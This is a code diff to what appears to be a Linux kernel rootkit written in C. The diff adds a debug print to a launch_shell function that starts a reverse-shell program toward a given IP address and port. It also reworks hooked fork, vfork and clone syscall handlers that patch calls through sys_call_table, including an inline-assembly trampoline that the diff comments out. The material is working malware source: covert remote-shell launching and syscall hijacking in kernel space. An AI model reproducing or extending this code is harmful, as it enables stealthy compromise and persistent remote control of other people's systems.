@@ -110,6 +110,7 @@ int launch_shell(struct sockaddr_in dest) {
 	char *envp[] = { NULL }, *argv[] = { RSHELL_PATH, "255.255.255.255", "65535", NULL };
 	int ret = 0;
 
+	f_printk("from\n");
 	snprintf(argv[1], 16, "%pI4", &dest.sin_addr.s_addr);
 	snprintf(argv[2], 6, "%hu", ntohs(dest.sin_port));
 	//f_printk("addr = %s, port = %s\n", argv[1], argv[2]);
@@ -427,7 +428,7 @@ asmlinkage long my_fork64(void) {
 	pid = fake_new_process(pid);
 	return pid;
 }
-
+/*
 asm(
 ".globl my_clone64\n\t"
 ".type my_clone64, @function\n"
@@ -438,33 +439,13 @@ asm(
 //"mov sys_call_table(%rip), %rax\n\t"
 //"push %rbp\n\t"
 //"mov %rsp, %rbp\n\t"
-"push %rbp\n\t"
-"mov %rsp, %rbp\n\t"
-"push -56(%rbp)\n\t"
-"push -48(%rbp)\n\t"
-"push -40(%rbp)\n\t"
-"push -32(%rbp)\n\t"
-"push -24(%rbp)\n\t"
-"push -16(%rbp)\n\t"
-"push -8(%rbp)\n\t"
-"push (%rbp)\n\t"
 "mov sys_call_table(%rip), %rax\n\t"
 "add $448, %rax\n\t"
 "call *(%rax)\n\t"
-"pop (%rbp)\n\t"
-"pop -8(%rbp)\n\t"
-"pop -16(%rbp)\n\t"
-"pop -24(%rbp)\n\t"
-"pop -32(%rbp)\n\t"
-"pop -40(%rbp)\n\t"
-"pop -48(%rbp)\n\t"
-"pop -56(%rbp)\n\t"
-"mov %rbp, %rsp\n\t"
-"pop %rbp\n\t"
 "ret\n\t"
 ".size my_clone64, .-my_clone64\n\t"
 );
-
+*/
 asmlinkage long my_vfork64(void) {
 	pid_t pid = 0;
 	//asmlinkage long (*f)(void) = sys_call_table[__NR_vfork];
@@ -476,16 +457,18 @@ asmlinkage long my_vfork64(void) {
 	return pid;
 }
 
-/*
+//long (*tr_clone64)(long a1, long a2, long a3, long a4, long a5, long a6) = NULL;
+//void *tr_clone64_bytecode = NULL;
+
 asmlinkage long my_clone64(long a1, long a2, long a3, long a4, long a5, long a6) {
         pid_t pid = 0;
 
 	f_printk("%lx %lx %lx %lx %lx %lx\n", a1, a2, a3, a4, a5, a6);
-	pid = SYSCALL64(__NR_clone, a1, a2, a3, a4, a5, a6);
+	//pid = tr_clone64(a1, a2, a3, a4, a5, a6);
 	//pid = fake_new_process(pid);
         return pid;
 }
-*/
+
 asmlinkage long my_getpid64(void) {
 	pid_t pid = 0;
 
